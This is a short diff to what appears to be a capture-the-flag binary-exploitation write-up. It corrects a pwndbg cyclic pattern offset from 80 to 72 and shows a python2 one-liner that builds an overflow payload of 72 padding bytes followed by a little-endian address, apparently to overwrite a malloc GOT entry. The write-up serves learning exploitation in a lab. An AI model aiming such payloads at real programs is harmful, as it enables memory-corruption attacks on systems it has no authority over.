@@ -8,7 +8,7 @@ We must overwrite malloc(4) = `0x0804a050` with value `0x08048468` by the addres
 ```
 pwndbg> cyclic -l uaaa
 Finding cyclic pattern of 4 bytes: b'uaaa' (hex: 0x75616161)
-Found at offset 80
+Found at offset 72
 ```
 
 `$(python2 -c 'print "A" * 72 + "\x54\x84\x04\x08"')`
